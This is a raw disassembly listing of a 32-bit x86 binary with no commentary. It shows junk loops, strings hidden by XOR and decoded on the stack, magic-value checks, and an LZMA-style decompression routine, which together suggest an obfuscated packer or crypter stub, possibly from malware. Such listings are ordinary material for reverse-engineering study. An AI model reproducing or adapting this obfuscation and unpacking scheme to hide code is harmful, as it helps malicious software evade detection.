  41f913:	mov    esi,DWORD PTR [ebp-0x4]
  41f916:	add    DWORD PTR ds:0x426eed,0x182c
  41f920:	push   edi
  41f921:	mov    edi,DWORD PTR [ebp-0x8]
  41f924:	or     ecx,edx
  41f926:	mov    ecx,0x75108b3
  41f92b:	sub    DWORD PTR ds:0x426ed1,edi
  41f931:	xor    esi,ecx
  41f933:	and    DWORD PTR ds:0x426eb1,0x0
  41f93d:	mov    edx,DWORD PTR ds:0x426eb1
  41f943:	inc    edx
  41f944:	mov    DWORD PTR ds:0x426eb1,edx
  41f94a:	cmp    DWORD PTR ds:0x426eb1,0x1e
  41f951:	jle    0x41f96f
  41f957:	jmp    0x41f962
  41f95c:	call   DWORD PTR ds:0x430a00
  41f962:	cmp    DWORD PTR ds:0x426eb1,0x19
  41f969:	jb     0x41f93d
  41f96f:	xor    edi,ecx
  41f971:	and    DWORD PTR ds:0x426e99,0x0
  41f97b:	jmp    0x41f98d
  41f980:	mov    edx,DWORD PTR ds:0x426e99
  41f986:	inc    edx
  41f987:	mov    DWORD PTR ds:0x426e99,edx
  41f98d:	cmp    DWORD PTR ds:0x426e99,0x12
  41f994:	jae    0x41f9eb
  41f99a:	cmp    DWORD PTR ds:0x426e99,0x4
  41f9a1:	ja     0x41f9eb
  41f9a7:	jmp    0x41f9cc
  41f9ac:	push   0x426efd
  41f9b1:	push   DWORD PTR [ebp-0x18]
  41f9b4:	push   DWORD PTR [ebp-0x14]
  41f9b7:	push   0x69eb
  41f9bc:	push   0x7974
  41f9c1:	push   0x5e98
  41f9c6:	call   DWORD PTR ds:0x430a40
  41f9cc:	cmp    DWORD PTR ds:0x426e99,0x3
  41f9d3:	jne    0x41f9e6
  41f9d9:	mov    edx,DWORD PTR ds:0x426e99
  41f9df:	inc    edx
  41f9e0:	mov    DWORD PTR ds:0x426e99,edx
  41f9e6:	jmp    0x41f980
  41f9eb:	mov    edx,0x3272fa
  41f9f0:	mov    DWORD PTR ds:0x426ef5,0xc6
  41f9fa:	add    edi,edx
  41f9fc:	add    esi,edx
  41f9fe:	imul   esi,edi
  41fa01:	mov    edi,DWORD PTR [ebp+0xc]
  41fa04:	cmp    edi,esi
  41fa06:	je     0x41fa5b
  41fa0c:	mov    DWORD PTR [ebp-0xc],eax
  41fa0f:	mov    eax,DWORD PTR [ebp-0xc]
  41fa12:	mov    esi,DWORD PTR [ebp+0xc]
  41fa15:	xor    eax,ecx
  41fa17:	lea    eax,[eax*8+0x1939848]
  41fa1e:	mov    eax,DWORD PTR [esi+eax*1]
  41fa21:	mov    DWORD PTR [ebp+0xc],eax
  41fa24:	mov    eax,DWORD PTR [ebp-0x4]
  41fa27:	mov    esi,DWORD PTR [ebp-0x8]
  41fa2a:	xor    eax,ecx
  41fa2c:	xor    esi,ecx
  41fa2e:	add    esi,edx
  41fa30:	add    eax,edx
  41fa32:	imul   eax,esi
  41fa35:	mov    esi,DWORD PTR [ebp+0xc]
  41fa38:	cmp    esi,eax
  41fa3a:	je     0x41fa5b
  41fa40:	mov    eax,DWORD PTR [ebp-0x4]
  41fa43:	xor    eax,ecx
  41fa45:	mov    ecx,DWORD PTR [ebp+0xc]
  41fa48:	add    eax,edx
  41fa4a:	imul   eax,ecx
  41fa4d:	add    eax,DWORD PTR [ebp+0x8]
  41fa50:	mov    DWORD PTR [ebp+0xc],eax
  41fa53:	mov    eax,DWORD PTR [ebp+0xc]
  41fa56:	jmp    0x41fa6c
  41fa5b:	mov    eax,DWORD PTR [ebp-0x4]
  41fa5e:	mov    esi,DWORD PTR [ebp-0x8]
  41fa61:	xor    esi,ecx
  41fa63:	xor    eax,ecx
  41fa65:	add    esi,edx
  41fa67:	add    eax,edx
  41fa69:	imul   eax,esi
  41fa6c:	pop    edi
  41fa6d:	pop    esi
  41fa6e:	leave  
  41fa6f:	ret    0x8
	...
  41fa82:	add    BYTE PTR [eax],al
  41fa84:	pop    ds
  41fa85:	sbb    esi,DWORD PTR [ebp+ecx*2+0x0]
  41fa89:	add    BYTE PTR [eax],al
  41fa8b:	add    BYTE PTR [edx],al
  41fa8d:	add    BYTE PTR [eax],al
  41fa8f:	add    BYTE PTR [ecx+0x0],al
  41fa92:	add    BYTE PTR [eax],al
  41fa94:	mov    al,ds:0xa00001fa
  41fa99:	out    dx,al
  41fa9a:	add    DWORD PTR [eax],eax
  41fa9c:	add    BYTE PTR [eax],al
  41fa9e:	add    BYTE PTR [eax],al
  41faa0:	push   edx
  41faa1:	push   ebx
  41faa2:	inc    esp
  41faa3:	push   ebx
  41faa4:	pop    edx
  41faa5:	loope  0x41fa60
  41faa7:	fld    DWORD PTR [ebp-0x61b4e8bd]
  41faad:	add    BYTE PTR [ecx-0x22],bl
  41fab0:	aaa    
  41fab1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fab2:	or     eax,0x15a
  41fab7:	add    BYTE PTR [ebx+0x3a],al
  41faba:	pop    esp
  41fabb:	inc    esi
  41fabc:	outs   dx,DWORD PTR ds:[esi]
  41fabd:	ins    BYTE PTR es:[edi],dx
  41fabe:	fs gs jb 0x41fae2
  41fac2:	outs   dx,DWORD PTR ds:[esi]
  41fac3:	data16 and BYTE PTR [edi+0x6f],dl
  41fac7:	jb     0x41fb34
  41fac9:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  41fad0:	push   0x65
  41fad2:	arpl   WORD PTR [esp+ebx*2+0x50],si
  41fad6:	jb     0x41fb47
  41fad8:	push   0x65
  41fada:	arpl   WORD PTR [esp+edx*2+0x65],si
  41fade:	jae    0x41fb54
  41fae0:	add    BYTE PTR [ebx-0x137e13ab],cl
  41fae6:	or     BYTE PTR [ecx],al
  41fae8:	add    BYTE PTR [eax],al
  41faea:	push   ebx
  41faeb:	mov    eax,ebx
  41faed:	xchg   ecx,eax
  41faee:	mov    eax,DWORD PTR [ebp+0x8]
  41faf1:	cmp    eax,0xf89c85b5
  41faf6:	jne    0x41ff8a
  41fafc:	mov    eax,DWORD PTR [ebp+0xc]
  41faff:	cmp    eax,0xf89c85b4
  41fb04:	jne    0x41ff8a
  41fb0a:	mov    eax,DWORD PTR [ebp+0x24]
  41fb0d:	mov    DWORD PTR [ebp-0x4],eax
  41fb10:	mov    eax,DWORD PTR [ebp-0x4]
  41fb13:	mov    eax,DWORD PTR [eax+0x1d8]
  41fb19:	mov    eax,DWORD PTR [eax]
  41fb1b:	mov    eax,DWORD PTR [eax]
  41fb1d:	mov    DWORD PTR [ebp-0x8],eax
  41fb20:	mov    BYTE PTR [ebp-0x18],0xe0
  41fb24:	mov    BYTE PTR [ebp-0x17],0xdf
  41fb28:	mov    BYTE PTR [ebp-0x16],0xe2
  41fb2c:	mov    BYTE PTR [ebp-0x15],0xac
  41fb30:	mov    BYTE PTR [ebp-0x14],0xad
  41fb34:	mov    BYTE PTR [ebp-0x13],0x7b
  41fb38:	mov    BYTE PTR [ebp-0x20],0xee
  41fb3c:	mov    BYTE PTR [ebp-0x1f],0xec
  41fb40:	mov    BYTE PTR [ebp-0x1e],0xde
  41fb44:	mov    BYTE PTR [ebp-0x1d],0xed
  41fb48:	mov    BYTE PTR [ebp-0x1c],0xac
  41fb4c:	mov    BYTE PTR [ebp-0x1b],0xad
  41fb50:	mov    BYTE PTR [ebp-0x1a],0x7b
  41fb54:	mov    BYTE PTR [ebp-0x28],0xec
  41fb58:	mov    BYTE PTR [ebp-0x27],0xe3
  41fb5c:	mov    BYTE PTR [ebp-0x26],0xe7
  41fb60:	mov    BYTE PTR [ebp-0x25],0xf0
  41fb64:	mov    BYTE PTR [ebp-0x24],0xda
  41fb68:	mov    BYTE PTR [ebp-0x23],0xeb
  41fb6c:	mov    BYTE PTR [ebp-0x22],0xe2
  41fb70:	mov    BYTE PTR [ebp-0x21],0x7b
  41fb74:	xor    ecx,ecx
  41fb76:	lea    eax,[ebp+ecx*1-0x18]
  41fb7a:	movzx  edx,BYTE PTR [eax]
  41fb7d:	xor    edx,0x81
  41fb83:	add    edx,0x6
  41fb86:	inc    ecx
  41fb87:	mov    BYTE PTR [eax],dl
  41fb89:	cmp    ecx,0x6
  41fb8c:	jb     0x41fb76
  41fb8e:	xor    ecx,ecx
  41fb90:	lea    eax,[ebp+ecx*1-0x20]
  41fb94:	movzx  edx,BYTE PTR [eax]
  41fb97:	xor    edx,0x81
  41fb9d:	add    edx,0x6
  41fba0:	inc    ecx
  41fba1:	mov    BYTE PTR [eax],dl
  41fba3:	cmp    ecx,0x7
  41fba6:	jb     0x41fb90
  41fba8:	xor    ecx,ecx
  41fbaa:	lea    eax,[ebp+ecx*1-0x28]
  41fbae:	movzx  edx,BYTE PTR [eax]
  41fbb1:	xor    edx,0x81
  41fbb7:	add    edx,0x6
  41fbba:	inc    ecx
  41fbbb:	mov    BYTE PTR [eax],dl
  41fbbd:	cmp    ecx,0x8
  41fbc0:	jb     0x41fbaa
  41fbc2:	lea    eax,[ebp-0x2c]
  41fbc5:	mov    DWORD PTR [ebp-0x8],eax
  41fbc8:	mov    ecx,DWORD PTR [ebp-0x8]
  41fbcb:	mov    eax,0x7113fcef
  41fbd0:	push   esi
  41fbd1:	mov    DWORD PTR [ecx],eax
  41fbd3:	mov    ecx,DWORD PTR [ebp-0x2c]
  41fbd6:	mov    esi,0x4e3c
  41fbdb:	push   edi
  41fbdc:	lea    edi,[esi-0x2]
  41fbdf:	mov    ebx,0x3272fa
  41fbe4:	cmp    ecx,eax
  41fbe6:	jne    0x41fcb7
  41fbec:	lea    eax,[esi+0x3b]
  41fbef:	mov    WORD PTR [ebp-0x78],ax
  41fbf3:	mov    eax,esi
  41fbf5:	mov    WORD PTR [ebp-0x76],ax
  41fbf9:	add    eax,0x3d
  41fbfc:	mov    WORD PTR [ebp-0x74],ax
  41fc00:	lea    eax,[esi+0x2]
  41fc03:	mov    WORD PTR [ebp-0x72],ax
  41fc07:	add    eax,0x41
  41fc0a:	mov    WORD PTR [ebp-0x70],ax
  41fc0e:	mov    eax,edi
  41fc10:	mov    WORD PTR [ebp-0x6e],ax
  41fc14:	mov    eax,0x4f90
  41fc19:	mov    WORD PTR [ebp-0x6c],ax
  41fc1d:	lea    eax,[esi-0x7]
  41fc20:	mov    WORD PTR [ebp-0x6a],ax
  41fc24:	add    eax,0x30
  41fc27:	mov    WORD PTR [ebp-0x68],ax
  41fc2b:	lea    eax,[esi-0xb]
  41fc2e:	mov    WORD PTR [ebp-0x66],ax
  41fc32:	mov    eax,esi
  41fc34:	mov    WORD PTR [ebp-0x64],ax
  41fc38:	add    eax,0xfffffff4
  41fc3b:	mov    WORD PTR [ebp-0x62],ax
  41fc3f:	mov    eax,0x44b
  41fc44:	mov    WORD PTR [ebp-0x60],ax
  41fc48:	mov    eax,0x567a
  41fc4d:	mov    WORD PTR [ebp-0x5e],ax
  41fc51:	mov    eax,0x611a
  41fc56:	mov    WORD PTR [ebp-0x5c],ax
  41fc5a:	mov    eax,0xf1e4
  41fc5f:	mov    WORD PTR [ebp-0x5a],ax
  41fc63:	mov    eax,edi
  41fc65:	mov    WORD PTR [ebp-0x58],ax
  41fc69:	lea    eax,[ebp-0xe0]
  41fc6f:	push   eax
  41fc70:	mov    eax,DWORD PTR [ebp+0xc]
  41fc73:	xor    eax,0x75108b3
  41fc78:	add    eax,ebx
  41fc7a:	push   eax
  41fc7b:	lea    eax,[ebp-0x78]
  41fc7e:	push   eax
  41fc7f:	mov    eax,DWORD PTR [ebp-0x4]
  41fc82:	mov    eax,DWORD PTR [eax+0x198]
  41fc88:	mov    DWORD PTR [ebp-0xe0],0x1
  41fc92:	mov    DWORD PTR [ebp-0xdc],0xffff
  41fc9c:	push   DWORD PTR [eax]
  41fc9e:	mov    eax,DWORD PTR [ebp+0x10]
  41fca1:	call   eax
  41fca3:	mov    DWORD PTR [ebp-0x8],eax
  41fca6:	mov    eax,DWORD PTR [ebp-0x8]
  41fca9:	test   eax,eax
  41fcab:	je     0x41fcb7
  41fcad:	xor    DWORD PTR ds:0xe041cd9,0x9f170bc8
  41fcb7:	mov    eax,DWORD PTR [ebp-0x4]
  41fcba:	mov    ecx,DWORD PTR [eax+0x18c]
  41fcc0:	xor    eax,eax
  41fcc2:	cmp    DWORD PTR [ecx],eax
  41fcc4:	jne    0x41fefa
  41fcca:	mov    ecx,DWORD PTR [ebp-0x4]
  41fccd:	mov    ecx,DWORD PTR [ecx+0x17c]
  41fcd3:	mov    DWORD PTR [ecx],eax
  41fcd5:	mov    ecx,DWORD PTR [ebp-0x4]
  41fcd8:	mov    ecx,DWORD PTR [ecx+0x180]
  41fcde:	mov    DWORD PTR [ecx],eax
  41fce0:	mov    eax,0x4e69
  41fce5:	mov    WORD PTR [ebp-0x9c],ax
  41fcec:	mov    eax,esi
  41fcee:	mov    WORD PTR [ebp-0x9a],ax
  41fcf5:	mov    eax,0x4e79
  41fcfa:	mov    WORD PTR [ebp-0x98],ax
  41fd01:	add    eax,0xffffffc0
  41fd04:	mov    WORD PTR [ebp-0x96],ax
  41fd0b:	mov    eax,0x4f8c
  41fd10:	mov    WORD PTR [ebp-0x94],ax
  41fd17:	mov    eax,0x4e38
  41fd1c:	mov    WORD PTR [ebp-0x92],ax
  41fd23:	mov    eax,esi
  41fd25:	mov    WORD PTR [ebp-0x8c],ax
  41fd2c:	mov    eax,0x4e35
  41fd31:	mov    WORD PTR [ebp-0x8a],ax
  41fd38:	mov    eax,0x99f9
  41fd3d:	mov    WORD PTR [ebp-0x88],ax
  41fd44:	mov    eax,0x8d68
  41fd49:	mov    WORD PTR [ebp-0x86],ax
  41fd50:	mov    eax,0xd66f
  41fd55:	mov    WORD PTR [ebp-0x84],ax
  41fd5c:	mov    BYTE PTR [ebp-0x10],0xec
  41fd60:	mov    eax,0xd78b
  41fd65:	mov    WORD PTR [ebp-0x82],ax
  41fd6c:	mov    BYTE PTR [ebp-0xf],0xe3
  41fd70:	mov    eax,0x278a
  41fd75:	mov    BYTE PTR [ebp-0xe],0xe7
  41fd79:	mov    WORD PTR [ebp-0x80],ax
  41fd7d:	mov    BYTE PTR [ebp-0xd],0xf0
  41fd81:	mov    eax,0x478a
  41fd86:	mov    BYTE PTR [ebp-0xc],0xda
  41fd8a:	mov    WORD PTR [ebp-0x7e],ax
  41fd8e:	mov    eax,0x4e3b
  41fd93:	mov    BYTE PTR [ebp-0xb],0xeb
  41fd97:	push   0x8
  41fd99:	mov    BYTE PTR [ebp-0xa],0xe2
  41fd9d:	mov    WORD PTR [ebp-0x7c],ax
  41fda1:	mov    BYTE PTR [ebp-0x9],0x7b
  41fda5:	mov    DWORD PTR [ebp-0x90],0x4e3a4e65
  41fdaf:	lea    eax,[ebp-0x10]
  41fdb2:	pop    edi
  41fdb3:	movzx  ecx,BYTE PTR [eax]
  41fdb6:	xor    ecx,0x81
  41fdbc:	add    ecx,0x6
  41fdbf:	mov    BYTE PTR [eax],cl
  41fdc1:	inc    eax
  41fdc2:	dec    edi
  41fdc3:	jne    0x41fdb3
  41fdc5:	mov    DWORD PTR [ebp-0xe0],0x1
  41fdcf:	lea    eax,[ebp-0x10]
  41fdd2:	mov    DWORD PTR [ebp-0xdc],eax
  41fdd8:	mov    ecx,0x4e64
  41fddd:	mov    eax,ecx
  41fddf:	mov    WORD PTR [ebp-0x40],ax
  41fde3:	add    eax,0xf
  41fde6:	mov    edx,eax
  41fde8:	mov    WORD PTR [ebp-0x3e],dx
  41fdec:	mov    edx,0x4f9b
  41fdf1:	mov    WORD PTR [ebp-0x3c],dx
  41fdf5:	add    edx,0xfffffff8
  41fdf8:	mov    WORD PTR [ebp-0x3a],dx
  41fdfc:	mov    edx,0x4f8d
  41fe01:	mov    WORD PTR [ebp-0x38],dx
  41fe05:	inc    edx
  41fe06:	mov    WORD PTR [ebp-0x36],dx
  41fe0a:	mov    edx,0x4f87
  41fe0f:	mov    WORD PTR [ebp-0x34],dx
  41fe13:	mov    WORD PTR [ebp-0x32],cx
  41fe17:	mov    ecx,esi
  41fe19:	mov    WORD PTR [ebp-0x30],cx
  41fe1d:	lea    ecx,[edx-0x3]
  41fe20:	mov    edx,ecx
  41fe22:	mov    WORD PTR [ebp-0x54],dx
  41fe26:	mov    edx,eax
  41fe28:	mov    WORD PTR [ebp-0x52],dx
  41fe2c:	mov    edx,0x4e7b
  41fe31:	mov    WORD PTR [ebp-0x50],dx
  41fe35:	mov    WORD PTR [ebp-0x4e],ax
  41fe39:	lea    eax,[edx-0xe]
  41fe3c:	mov    WORD PTR [ebp-0x4c],ax
  41fe40:	inc    eax
  41fe41:	mov    WORD PTR [ebp-0x4a],ax
  41fe45:	lea    eax,[edx-0x14]
  41fe48:	mov    WORD PTR [ebp-0x48],ax
  41fe4c:	mov    WORD PTR [ebp-0x46],cx
  41fe50:	mov    WORD PTR [ebp-0x44],si
  41fe54:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe57:	movzx  edx,WORD PTR [ebp-0x54]
  41fe5b:	mov    eax,0x75108b3
  41fe60:	xor    ecx,eax
  41fe62:	add    ecx,ebx
  41fe64:	xor    ecx,edx
  41fe66:	mov    WORD PTR [ebp-0x54],cx
  41fe6a:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe6d:	xor    ecx,eax
  41fe6f:	movzx  eax,WORD PTR [ebp-0x40]
  41fe73:	add    ecx,ebx
  41fe75:	xor    ecx,eax
  41fe77:	xor    eax,eax
  41fe79:	mov    WORD PTR [ebp-0x40],cx
  41fe7d:	mov    WORD PTR [ebp-0xf4],ax
  41fe84:	mov    WORD PTR [ebp-0x108],ax
  41fe8b:	mov    edi,DWORD PTR [ebp+0x24]
  41fe8e:	lea    eax,[ebp-0xf4]
  41fe94:	lea    edx,[ebp-0x54]
  41fe97:	mov    DWORD PTR [ebp-0xe0],0x2
  41fea1:	mov    DWORD PTR [ebp-0xdc],eax
  41fea7:	call   0x4228e9
  41feac:	mov    ecx,DWORD PTR [ebp+0x8]
  41feaf:	mov    DWORD PTR [ebp-0xd8],eax
  41feb5:	mov    eax,0x75108b3
  41feba:	xor    ecx,eax
  41febc:	add    ecx,ebx
  41febe:	je     0x41fedd
  41fec0:	lea    ecx,[ebp-0xe0]
  41fec6:	push   ecx
  41fec7:	mov    ecx,DWORD PTR [ebp+0xc]
  41feca:	xor    ecx,eax
  41fecc:	add    ecx,ebx
  41fece:	push   ecx
  41fecf:	lea    eax,[ebp-0x9c]
  41fed5:	push   eax
  41fed6:	mov    eax,DWORD PTR [ebp+0x10]
  41fed9:	push   0x0
  41fedb:	call   eax
  41fedd:	mov    edi,DWORD PTR [ebp+0x24]
  41fee0:	lea    eax,[ebp-0x108]
  41fee6:	lea    edx,[ebp-0x40]
  41fee9:	mov    DWORD PTR [ebp-0xdc],eax
  41feef:	call   0x4228e9
  41fef4:	mov    DWORD PTR [ebp-0xd8],eax
  41fefa:	mov    eax,DWORD PTR [ebp+0x14]
  41fefd:	push   DWORD PTR [ebp-0x4]
  41ff00:	push   DWORD PTR [ebp+0x20]
  41ff03:	push   DWORD PTR [ebp+0x1c]
  41ff06:	push   DWORD PTR [ebp+0x18]
  41ff09:	push   DWORD PTR [ebp+0x10]
  41ff0c:	push   DWORD PTR [ebp+0x8]
  41ff0f:	push   DWORD PTR [ebp+0xc]
  41ff12:	call   0x42118a
  41ff17:	test   eax,eax
  41ff19:	je     0x41ff60
  41ff1b:	add    DWORD PTR [ebp-0x4],eax
  41ff1e:	push   DWORD PTR [ebp-0x4]
  41ff21:	lea    esi,[ebp+0x4]
  41ff24:	call   0x420378
  41ff29:	mov    eax,DWORD PTR [ebp-0x4]
  41ff2c:	mov    eax,DWORD PTR [eax+0x1c8]
  41ff32:	mov    eax,DWORD PTR [eax]
  41ff34:	xor    eax,0x75108b3
  41ff39:	add    eax,ebx
  41ff3b:	mov    eax,DWORD PTR [ebp-0x4]
  41ff3e:	jne    0x41ff56
  41ff40:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff43:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ff49:	push   DWORD PTR [ecx]
  41ff4b:	mov    eax,DWORD PTR [eax+0x1e0]
  41ff51:	call   DWORD PTR [eax+0x28]
  41ff54:	jmp    0x41ff60
  41ff56:	mov    eax,DWORD PTR [eax+0x17c]
  41ff5c:	mov    eax,DWORD PTR [eax]
  41ff5e:	add    DWORD PTR [esi],eax
  41ff60:	mov    eax,DWORD PTR [ebp-0x4]
  41ff63:	mov    eax,DWORD PTR [eax+0x1dc]
  41ff69:	dec    DWORD PTR [eax]
  41ff6b:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff6e:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ff74:	mov    eax,DWORD PTR [eax]
  41ff76:	lea    eax,[ecx+eax*4]
  41ff79:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff7c:	mov    ecx,DWORD PTR [ecx+0x17c]
  41ff82:	mov    eax,DWORD PTR [eax]
  41ff84:	mov    ecx,DWORD PTR [ecx]
  41ff86:	add    DWORD PTR [eax],ecx
  41ff88:	pop    edi
  41ff89:	pop    esi
  41ff8a:	pop    ebx
  41ff8b:	leave  
  41ff8c:	ret    0x20
  41ff8f:	push   edi
  41ff90:	push   esi
  41ff91:	push   ebx
  41ff92:	push   ebp
  41ff93:	mov    ebp,esp
  41ff95:	mov    eax,DWORD PTR [ebp+0x24]
  41ff98:	add    DWORD PTR [ebp+0x28],eax
  41ff9b:	push   eax
  41ff9c:	cld    
  41ff9d:	mov    esi,DWORD PTR [ebp+0x18]
  41ffa0:	add    DWORD PTR [ebp+0x1c],esi
  41ffa3:	push   esi
  41ffa4:	mov    esi,DWORD PTR [ebp+0x14]
  41ffa7:	lods   eax,DWORD PTR ds:[esi]
  41ffa8:	xchg   edx,eax
  41ffa9:	push   edx
  41ffaa:	mov    cl,BYTE PTR [esi-0x2]
  41ffad:	or     eax,0xffffffff
  41ffb0:	shl    eax,cl
  41ffb2:	not    eax
  41ffb4:	push   eax
  41ffb5:	mov    cl,dh
  41ffb7:	or     eax,0xffffffff
  41ffba:	shl    eax,cl
  41ffbc:	not    eax
  41ffbe:	push   eax
  41ffbf:	add    cl,dl
  41ffc1:	mov    edi,esi
  41ffc3:	sub    esp,0xc
  41ffc6:	sub    eax,eax
  41ffc8:	inc    eax
  41ffc9:	push   eax
  41ffca:	push   eax
  41ffcb:	push   eax
  41ffcc:	push   eax
  41ffcd:	push   eax
  41ffce:	push   edi
  41ffcf:	sub    esi,esi
  41ffd1:	push   esi
  41ffd2:	or     ebx,0xffffffff
  41ffd5:	mov    eax,0x300
  41ffda:	shl    eax,cl
  41ffdc:	lea    ecx,[eax+0x736]
  41ffe2:	mov    eax,0x4000400
  41ffe7:	shr    ecx,1
  41ffe9:	rep stos DWORD PTR es:[edi],eax
  41ffeb:	push   0x5
  41ffed:	pop    ecx
  41ffee:	call   0x4202d9
  41fff3:	loop   0x41ffee
  41fff5:	lea    esi,[esi]
  41fff7:	lea    edi,[edi]
  41fff9:	mov    edi,DWORD PTR [ebp-0x4]
  41fffc:	mov    eax,DWORD PTR [ebp-0x10]
  41ffff:	sub    edi,DWORD PTR [ebp+0x24]
  420002:	and    eax,edi
  420004:	mov    DWORD PTR [ebp-0x18],eax
  420007:	mov    al,0x0
  420009:	call   0x4202f1
  42000e:	jne    0x4200a9
  420014:	mov    cl,BYTE PTR [ebp-0xc]
  420017:	and    edi,DWORD PTR [ebp-0x14]
  42001a:	shl    edi,cl
  42001c:	sub    cl,0x8
  42001f:	neg    cl
  420021:	shr    esi,cl
  420023:	pop    eax
  420024:	add    edi,esi
  420026:	pop    esi
  420027:	lea    edi,[edi+edi*2]
  42002a:	shl    edi,0x8
  42002d:	cmp    al,0x7
  42002f:	pop    edx
  420030:	lea    ecx,[esi+edi*2+0xe6c]
  420037:	push   ecx
  420038:	push   esi
  420039:	mov    esi,0x100
  42003e:	push   eax
  42003f:	mov    al,0x1
  420041:	jb     0x420077
  420043:	mov    edi,DWORD PTR [ebp-0x4]
  420046:	sub    edi,DWORD PTR [ebp-0x24]
  420049:	movzx  edi,BYTE PTR [edi]
  42004c:	mov    ebp,DWORD PTR [ebp-0x34]
  42004f:	shl    edi,1
  420051:	mov    ecx,esi
  420053:	and    esi,edi
  420055:	add    ecx,esi
  420057:	lea    ebp,[ebp+ecx*2+0x0]
  42005b:	call   0x420310
  420060:	mov    ecx,eax
  420062:	shr    esi,0x8
  420065:	and    ecx,0x1
  420068:	cmp    esi,ecx
  42006a:	mov    esi,0x100
  42006f:	jne    0x42007f
  420071:	cmp    eax,esi
  420073:	jb     0x42004c
  420075:	jmp    0x42008b
  420077:	mov    ebp,DWORD PTR [ebp-0x34]
  42007a:	call   0x420310
  42007f:	inc    eax
  420080:	inc    esi
  420081:	sub    eax,0x1
  420084:	sub    esi,0x1
  420087:	cmp    eax,esi
  420089:	jb     0x420077
  42008b:	pop    edx
  42008c:	inc    edx
  42008d:	cmp    edx,0x5
  420090:	dec    edx
  420091:	mov    ecx,edx
  420093:	jb     0x4200a4
  420095:	inc    edx
  420096:	cmp    edx,0xb
  420099:	dec    edx
  42009a:	mov    cl,0x4
  42009c:	dec    cl
  42009e:	jb     0x4200a4
  4200a0:	mov    cl,0x7
  4200a2:	dec    cl
  4200a4:	sub    edx,ecx
  4200a6:	push   edx
  4200a7:	jmp    0x4200f8
  4200a9:	mov    al,0xc1
  4200ab:	dec    al
  4200ad:	call   0x420301
  4200b2:	jne    0x4200c8
  4200b4:	pop    eax
  4200b5:	pop    edi
  4200b6:	pop    edx
  4200b7:	pop    ecx
  4200b8:	pop    edx
  4200b9:	pop    ecx
  4200ba:	push   DWORD PTR [esp]
  4200bd:	push   ecx
  4200be:	push   edx
  4200bf:	mov    edx,0x664
  4200c4:	mov    cl,0x0
  4200c6:	jmp    0x42013b
  4200c8:	mov    al,0xcd
  4200ca:	dec    al
  4200cc:	call   0x420301
  4200d1:	jne    0x420101
  4200d3:	mov    al,0xf1
  4200d5:	dec    al
  4200d7:	call   0x4202f1
  4200dc:	jne    0x420131
  4200de:	pop    eax
  4200df:	cmp    al,0x7
  4200e1:	mov    al,0x9
  4200e3:	jb     0x4200e7
  4200e5:	mov    al,0xb
  4200e7:	push   eax
  4200e8:	mov    esi,DWORD PTR [ebp-0x4]
  4200eb:	sub    esi,DWORD PTR [ebp-0x24]
  4200ee:	cmp    esi,DWORD PTR [ebp+0x24]
  4200f1:	jb     0x4202c8
  4200f7:	lods   al,BYTE PTR ds:[esi]
  4200f8:	mov    edi,DWORD PTR [ebp-0x4]
  4200fb:	stos   BYTE PTR es:[edi],al
  4200fc:	jmp    0x42028f
  420101:	mov    al,0xd8
  420103:	call   0x420301
  420108:	mov    esi,DWORD PTR [ebp-0x28]
  42010b:	je     0x420128
  42010d:	mov    al,0xe4
  42010f:	call   0x420301
  420114:	mov    esi,DWORD PTR [ebp-0x2c]
  420117:	je     0x420122
  420119:	mov    esi,DWORD PTR [ebp-0x30]
  42011c:	mov    ecx,DWORD PTR [ebp-0x2c]
  42011f:	mov    DWORD PTR [ebp-0x30],ecx
  420122:	mov    ecx,DWORD PTR [ebp-0x28]
  420125:	mov    DWORD PTR [ebp-0x2c],ecx
  420128:	mov    ecx,DWORD PTR [ebp-0x24]
  42012b:	mov    DWORD PTR [ebp-0x28],ecx
  42012e:	mov    DWORD PTR [ebp-0x24],esi
  420131:	pop    eax
  420132:	pop    edi
  420133:	pop    ecx
  420134:	mov    edx,0xa68
  420139:	mov    cl,0x8
  42013b:	add    edx,edi
  42013d:	push   edx
  42013e:	push   edi
  42013f:	cmp    al,0x7
  420141:	mov    al,cl
  420143:	jb     0x420147
  420145:	add    al,0x3
  420147:	push   eax
  420148:	mov    ebp,DWORD PTR [ebp-0x34]
  42014b:	call   0x42030e
  420150:	jne    0x420166
  420152:	mov    eax,DWORD PTR [ebp-0x18]
  420155:	mov    edi,DWORD PTR [ebp-0x34]
  420158:	shl    eax,0x3
  42015b:	sub    ecx,ecx
  42015d:	push   0x8
  42015f:	pop    esi
  420160:	lea    edi,[edi+eax*2+0x4]
  420164:	jmp    0x42019b
  420166:	mov    ebp,DWORD PTR [ebp-0x34]
  420169:	add    ebp,0x2
  42016c:	call   0x42030e
  420171:	jne    0x42018b
  420173:	mov    eax,DWORD PTR [ebp-0x18]
  420176:	mov    edi,DWORD PTR [ebp-0x34]
  420179:	shl    eax,0x3
  42017c:	push   0x8
  42017e:	pop    ecx
  42017f:	push   0x8
  420181:	pop    esi
  420182:	lea    edi,[edi+eax*2+0x104]
  420189:	jmp    0x42019b
  42018b:	mov    edi,0x204
  420190:	add    edi,DWORD PTR [ebp-0x34]
  420193:	push   0x10
  420195:	pop    ecx
  420196:	mov    esi,0x100
  42019b:	mov    DWORD PTR [ebp-0x1c],ecx
  42019e:	sub    eax,eax
  4201a0:	inc    eax
  4201a1:	mov    ebp,edi
  4201a3:	call   0x420310
  4201a8:	mov    ecx,eax
  4201aa:	sub    ecx,esi
  4201ac:	jb     0x4201a1
  4201ae:	add    DWORD PTR [ebp-0x1c],ecx
  4201b1:	cmp    DWORD PTR [ebp-0x3c],0x4
  4201b5:	jae    0x42026b
  4201bb:	add    DWORD PTR [ebp-0x3c],0x7
  4201bf:	mov    ecx,DWORD PTR [ebp-0x1c]
  4201c2:	cmp    ecx,0x4
  4201c5:	jb     0x4201ca
  4201c7:	push   0x3
  4201c9:	pop    ecx
  4201ca:	mov    edi,DWORD PTR [ebp-0x38]
  4201cd:	shl    ecx,0x6
  4201d0:	sub    eax,eax
  4201d2:	inc    eax
  4201d3:	push   0x40
  4201d5:	pop    esi
  4201d6:	lea    edi,[edi+ecx*2+0x360]
  4201dd:	mov    ebp,edi
  4201df:	call   0x420310
  4201e4:	mov    ecx,eax
